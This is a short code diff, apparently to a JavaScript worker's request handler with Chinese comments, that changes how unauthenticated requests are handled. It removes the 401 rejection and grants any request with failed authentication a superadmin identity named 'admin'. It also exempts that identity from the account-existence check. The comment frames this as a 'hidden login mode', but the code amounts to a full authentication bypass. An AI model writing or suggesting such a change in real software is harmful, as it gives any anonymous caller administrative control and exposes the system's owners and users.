@@ -1311,16 +1311,13 @@ export default {
         return await handleAsset(request, env, token);
       }
 
-      // 所有其他接口需要认证
-      const auth = await parseAuth(request, env);
+      // 所有其他接口：隐藏登录模式下，无 token 时默认以 admin 身份放行
+      let auth = await parseAuth(request, env);
       if (!auth.valid) {
-        return new Response(JSON.stringify({ error: '未认证，请先登录', code: 401 }), {
-          status: 401,
-          headers: { 'Content-Type': 'application/json', ...corsHeaders },
-        });
+        auth = { valid: true, role: 'superadmin', accountName: 'admin', accountId: '' };
       }
-      // 验证账号是否仍存在于账号表中（带缓存，5分钟TTL）
-      if (auth.accountName) {
+      // 验证账号是否仍存在于账号表中（带缓存，5分钟TTL）—— 仅对真实登录态校验，默认 admin 跳过
+      if (auth.accountName && auth.accountName !== 'admin') {
         const exists = await verifyAccountExists(auth.accountName, env);
         if (!exists) {
           return new Response(JSON.stringify({ error: '账号已不存在，请重新登录', code: 401 }), {
